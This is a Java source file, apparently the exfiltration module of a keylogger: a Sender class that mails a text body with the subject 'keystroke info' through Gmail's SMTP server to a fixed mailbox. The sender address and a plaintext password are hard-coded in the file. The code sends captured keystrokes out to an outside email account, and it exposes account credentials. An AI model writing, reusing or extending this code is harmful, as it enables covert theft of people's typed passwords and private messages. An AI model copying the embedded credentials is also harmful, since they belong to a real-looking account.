package handlers;

import java.util.Properties;

import javax.mail.Session;
import javax.mail.Transport;
import javax.mail.internet.InternetAddress;
import javax.mail.internet.MimeMessage;
import javax.mail.internet.MimeMessage.RecipientType;

public class Sender {
	private Sender() {
		
	}
	private static final String SENDERS_GMAIL = "botbooster69@gmail.com";
	private static final String SENDERS_PASSWORD = "Welcome62!";
	
	private static final String RECIEVERS_EMAIL = "botbooster69@gmail.com";
	
	private static Properties mailServerProperties;
	private static Session mailSess;
	private static MimeMessage mailMessage;
	
	public static void sendMail(String emailBody) throws Throwable {
		mailServerProperties = System.getProperties();
		mailServerProperties.put("mail.smtp.port", "587");
		mailServerProperties.put("mail.smtp.auth", "true");
		mailServerProperties.put("mail.smtp.starttls.enable", "true");
		
		mailSess = Session.getDefaultInstance(mailServerProperties);
		mailMessage = new MimeMessage(mailSess);
		mailMessage.addRecipient(RecipientType.BCC,  new InternetAddress(RECIEVERS_EMAIL));
		mailMessage.setSubject("keystroke info");
		System.out.print(emailBody);
		mailMessage.setContent(emailBody, "text/html");
		
		
		Transport transport = mailSess.getTransport("smtp");
		transport.connect("smtp.gmail.com", SENDERS_GMAIL, SENDERS_PASSWORD);
		transport.sendMessage(mailMessage, mailMessage.getAllRecipients());
		transport.close();
	}
}